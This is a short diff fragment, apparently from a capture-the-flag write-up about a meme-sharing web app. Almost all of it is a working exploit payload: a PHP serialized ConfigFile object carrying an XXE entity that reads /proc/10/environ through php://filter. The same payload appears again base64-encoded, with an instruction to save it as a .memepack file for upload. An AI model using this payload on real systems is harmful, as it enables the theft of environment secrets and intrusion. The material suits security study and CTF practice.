-a:2:{i:0;s:93:"../data/memes/1538175596-[REDACTED_SECRET].txt";i:1;O:10:"ConfigFile":1:{s:10:"config_raw";s:276:"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=file:///proc/10/environ'>]><meme><toptext>qwerty</toptext><bottomtext>asdasd</bottomtext><template>&xxe;</template><type>TEXT</type></meme>";}}
+a:2:{i:0;s:93:"../data/memes/1538175596-8bc89487fb699b9a757aaeec7cc4f19bdcfcb436cdbeac3389f8a91908721f17.txt";i:1;O:10:"ConfigFile":1:{s:10:"config_raw";s:276:"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=file:///proc/10/environ'>]><meme><toptext>qwerty</toptext><bottomtext>asdasd</bottomtext><template>&xxe;</template><type>TEXT</type></meme>";}}
 ```
 
 which is the following base64-string
 
 ```
-[REDACTED_SECRET]/[REDACTED_SECRET]+[REDACTED_SECRET]+PG1lbWU+PHRvcHRleHQ+[REDACTED_SECRET]+[REDACTED_SECRET]+PC9tZW1lPiI7fX0=
+YToyOntpOjA7czo5MzoiLi4vZGF0YS9tZW1lcy8xNTM4MTc1NTk2LThiYzg5NDg3ZmI2OTliOWE3NTdhYWVlYzdjYzRmMTliZGNmY2I0MzZjZGJlYWMzMzg5ZjhhOTE5MDg3MjFmMTcudHh0IjtpOjE7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyNzY6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPjwhRU5USVRZIHh4ZSBTWVNURU0gJ3BocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZmlsZTovLy9wcm9jLzEwL2Vudmlyb24nPl0+PG1lbWU+PHRvcHRleHQ+cXdlcnR5PC90b3B0ZXh0Pjxib3R0b210ZXh0PmFzZGFzZDwvYm90dG9tdGV4dD48dGVtcGxhdGU+Jnh4ZTs8L3RlbXBsYXRlPjx0eXBlPlRFWFQ8L3R5cGU+PC9tZW1lPiI7fX0=
 ```
 and save it as "memes.memepack" -file
 
